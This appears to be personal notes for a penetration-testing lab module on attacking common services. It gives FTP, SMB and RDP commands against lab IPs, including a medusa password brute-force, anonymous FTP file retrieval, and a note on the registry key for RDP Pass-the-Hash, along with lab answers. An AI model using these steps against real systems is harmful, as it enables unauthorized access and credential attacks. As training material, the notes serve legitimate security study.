# Attacking Common Services

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## FTP

### Attacking FTP

**What port is the FTP service running on?**

* `nmap 10.129.27.170 -sVC`
  * FTP on port 2121

**What username is available for the FTP server?**

`ftp anonymous@<IP> 2121`

`get users.list`&#x20;

`get passwords.list`

* try users from the list...
  * second one (robin) working

**Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.**

`medusa -u robin -P passwords.list -h 10.129.205.248 -n 2121 -M ftp`

`ssh robin@10.129.205.248`

* PW
* cat flag.txt

## SMB

### Attacking SMB

`smbclient -L //10.129.205.248/`

`smbmap -H 10.129.205.248`

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



## SQL Databases

### Attacking SQL Databases

## RDP

### Attacking RDP

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* connect via RDP

**What is the name of the file that was left on the Desktop? (Format example: filename.txt)**

* pentest-notes.txt

**Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**

* DisableRestrictedAdmin

**Connect via RDP with the Administrator account and submit the flag.txt as you answer.**

*

## DNS

### Attacking DNS

## SMTP

### Attacking Email Services

## Skills Assessment

### Easy

### Medium

### Hard
